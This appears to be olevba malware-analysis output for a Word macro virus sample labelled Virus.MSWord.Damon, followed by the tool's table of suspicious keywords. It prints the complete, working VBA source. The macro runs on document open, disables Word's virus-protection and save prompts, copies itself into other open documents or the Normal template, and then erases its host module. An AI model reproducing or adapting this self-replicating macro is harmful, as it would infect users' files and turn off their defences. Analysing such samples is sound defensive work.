olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Damon-313915fcf1ebd1ebbe77cc7b0fc4f47d299a6a22
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Damon-313915fcf1ebd1ebbe77cc7b0fc4f47d299a6a22 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = 0
TD = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
If Documents.Count > 1 Then
A = Int(Rnd * Documents.Count) + 1
If A > Documents.Count Then A = A - 1
If Documents.Item(A) = ThisDocument Then End
Set Target = Documents.Item(A).VBProject.VBComponents.Item(1).CodeModule
Target.DeleteLines 1, Target.CountOfLines
Target.AddFromString TD
Documents.Item(A).SaveAs FileName:=Documents.Item(A).FullName
Set Host = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
Host.DeleteLines 1, Host.CountOfLines
ThisDocument.SaveAs FileName:=ThisDocument.FullName
Else
If ThisDocument = ActiveDocument Then
Set Target = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Target.DeleteLines 1, Target.CountOfLines
Target.AddFromString TD
Set Host = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
Host.DeleteLines 1, Host.CountOfLines
ThisDocument.SaveAs FileName:=ThisDocument.FullName
End If
If ThisDocument = NormalTemplate Then
Set Target = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Target.DeleteLines 1, Target.CountOfLines
Target.AddFromString TD
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Set Host = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
Host.DeleteLines 1, Host.CountOfLines
End If
End If
End Sub
'Nomad By Lys Kovick
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

